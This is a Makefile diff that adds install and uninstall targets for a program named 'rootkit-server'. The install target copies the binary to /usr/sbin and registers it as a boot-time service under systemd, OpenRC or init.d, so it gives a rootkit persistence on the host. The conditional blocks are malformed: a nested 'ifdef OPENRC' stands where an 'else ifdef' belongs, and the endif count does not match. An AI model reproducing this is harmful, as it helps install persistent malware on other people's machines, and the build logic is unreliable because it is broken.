@@ -44,7 +44,31 @@ clean:
 	rm -rf $(TARGET) $(OBJ_SUBDIRS)
 
 install: $(TARGET)
-	$(INSTALL) -D $(TARGET) /usr/sbin/$(TARGET)
+	ifdef SYSTEMD
+		$(INSTALL) -D $(TARGET) /usr/sbin/$(TARGET)
+		cp daemon/systemd/rootkit-server.service /etc/systemd/system/
+		systemctl daemon-reload
+		systemctl enable rootkit-server
+		ifdef OPENRC
+		$(INSTALL) -D $(TARGET) /usr/sbin/$(TARGET)
+		cp daemon/openrc/rootkit-server /etc/init.d/
+	rc-update add rootkit-server default
+		else ifdef INITRC
+		$(INSTALL) -D $(TARGET) /usr/sbin/$(TARGET)
+		cp daemon/initrc/rootkit-server /etc/init.d/
+		update-rc.d rootkit-server defaults
+	endif
 
 uninstall:
 	rm -f /usr/sbin/$(TARGET)
+	ifdef SYSTEMD
+		systemctl disable rootkit-server
+		rm -f /etc/systemd/system/rootkit-server.service
+		systemctl daemon-reload
+	else ifdef OPENRC
+		rc-update del rootkit-server default
+		rm -f /etc/init.d/rootkit-server
+	else ifdef INITRC
+		update-rc.d -f rootkit-server remove
+		rm -f /etc/init.d/rootkit-server
+	endif
